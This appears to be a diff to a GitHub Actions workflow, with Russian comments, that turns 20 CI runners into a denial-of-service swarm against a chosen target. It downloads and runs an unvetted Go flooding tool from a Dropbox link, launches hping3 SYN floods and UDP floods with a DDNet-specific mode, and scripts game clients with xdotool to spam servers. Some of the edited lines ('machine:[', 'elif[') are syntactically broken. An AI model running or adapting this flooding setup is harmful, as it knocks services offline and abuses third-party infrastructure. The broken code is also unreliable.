@@ -8,7 +8,7 @@ jobs:
     strategy:
       fail-fast: false
       matrix:
-        machine: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+        machine:[1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
     
     steps:
       - name: Preparing Environment
@@ -23,19 +23,19 @@ jobs:
           chmod +x bombardier && sudo mv bombardier /usr/local/bin/
           wget -O bombarida.go "https://www.dropbox.com/scl/fi/zomtm1n4fk8c9bhigxo6c/bombarida.go?rlkey=7axesdmxaztkxo7ie55uybp3m&st=lgr6k8u6&dl=1"
           
-          # 2. ИСПРАВЛЕННЫЙ БЛОК DDNET (автоматическая коррекция ссылки)
+          # 2. ИСПРАВЛЕННЫЙ БЛОК DDNET (добавлена директория /downloads/)
           echo "Finding DDNet link..."
-          RAW_LINK=$(curl -s https://ddnet.org/downloads/ | grep -oP 'href="\K[^"]+linux_x86_64.tar.xz' | head -n 1)
+          RAW_LINK=$(curl -s https://ddnet.org/downloads/ | grep -oP 'href="\K[^"]+linux_x86_64\.tar\.xz' | head -n 1)
           
           if [[ "$RAW_LINK" == http* ]]; then
             FULL_URL="$RAW_LINK"
           elif [[ "$RAW_LINK" == /* ]]; then
             FULL_URL="https://ddnet.org$RAW_LINK"
           else
-            FULL_URL="https://ddnet.org/$RAW_LINK"
+            # Вот тут была ошибка! Не хватало папки downloads
+            FULL_URL="https://ddnet.org/downloads/$RAW_LINK"
           fi
           
-          # Очистка от возможного мусора и скачивание
           FULL_URL=$(echo "$FULL_URL" | xargs)
           echo "Final URL: $FULL_URL"
           wget -O ddnet.tar.xz "$FULL_URL"
@@ -81,7 +81,7 @@ jobs:
                   xdotool windowactivate --sync $WID
                   if [ "$TYPE" == "connect" ]; then
                     xdotool key F1; sleep 0.2; xdotool type "connect $TARGET"; xdotool key Return; xdotool key F1
-                  elif [ "$TYPE" == "chat" ]; then
+                  elif[ "$TYPE" == "chat" ]; then
                     xdotool key t; sleep 0.2; xdotool type "$TARGET"; xdotool key Return
                   elif [ "$TYPE" == "disconnect" ]; then
                     xdotool key F1; sleep 0.2; xdotool type "disconnect"; xdotool key Return; xdotool key F1
@@ -97,7 +97,7 @@ jobs:
                 sudo hping3 --flood -S -p $PORT $TARGET &
               elif [ "$TYPE" == "udp" ]; then
                 go run ../bombarida.go -mode client -addr "${TARGET}:${PORT}" -c $CONNS -n 0 -d 600s -r 0 -t 1s &
-              elif [ "$TYPE" == "udp-ddnet" ]; then
+              elif[ "$TYPE" == "udp-ddnet" ]; then
                 go run ../bombarida.go -mode client -addr "${TARGET}:${PORT}" -ddnet-info -open-loop -c $CONNS -n 0 -d 600s -r 0 -t 1s &
               fi
             fi
